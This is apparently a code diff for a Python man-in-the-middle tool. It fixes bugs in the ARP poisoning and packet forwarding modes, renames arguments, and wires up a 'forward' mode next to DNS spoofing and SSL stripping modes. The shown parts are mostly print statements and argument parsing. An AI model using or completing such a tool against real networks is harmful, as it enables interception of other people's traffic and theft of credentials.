@@ -53,13 +53,13 @@ def resolve_mac(ip, iface):
 def run_arp_poisoning(args):
     """Execute ARP poisoning attack"""
     print(f"[+] Starting ARP Poisoning Attack")
-    print(f"    Victim: {args.victim_ip} ({args.victim_mac})")
+    print(f"    Victim: {args.victim_ip}")
     print(f"    Spoofing: {args.server_ip}")
     print(f"    Interface: {args.interface}")
     print(f"    Interval: {args.interval}s")
     print("[!] Press Ctrl+C to stop")
 
-    _, local_ip, local_mac = get_network_info
+    _, local_ip, local_mac = get_network_info()
     victim_mac = resolve_mac(args.victim_ip, args.interface)
     server_mac = resolve_mac(args.server_ip, args.interface)
     
@@ -92,11 +92,11 @@ def run_forwarding(args):
     print(f"[+] Starting packet forwarding")
     print(f"    Victim: {args.victim_ip}")
     print(f"    Gateway: {args.gateway_ip}s")
-    print(f"    Attacker: {args.gateway_ip}s")
+    print(f"    Attacker: {args.attacker_ip}s")
     print(f"    Interface: {args.interface}")
     print("[!] Press Ctrl+C to stop")
     forwarder = PacketForwarder(
-        iface=args.interface,
+        interface=args.interface,
         victim_ip=args.victim_ip,
         gateway_ip=args.gateway_ip,
         attacker_ip=args.attacker_ip
@@ -147,7 +147,7 @@ def main():
     # Forwarding parser
     forward_parser = subparsers.add_parser('forward', help='Packet Forwarding attack')
     forward_parser.add_argument('--victim-ip', required=True, help='Victim IP address')
-    forward_parser.add_argument('--server-ip', required=True, help='Server IP address to forward packets to')
+    forward_parser.add_argument('--gateway-ip', required=True, help='Server IP address to forward packets to')
     forward_parser.add_argument('--interface', default=default_iface, help='Network interface')
     forward_parser.add_argument('--attacker-ip', default=local_ip, help='Attacker IP address')
 
@@ -180,6 +180,8 @@ def main():
     
     elif args.mode == 'dns':
         run_dns_spoofing(args)
+    elif args.mode == 'forward':
+        run_forwarding(args)
     
     elif args.mode == 'ssl':
         if not validate_ip(args.target):
@@ -187,7 +189,7 @@ def main():
             sys.exit(1)
         run_ssl_stripping(args)
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
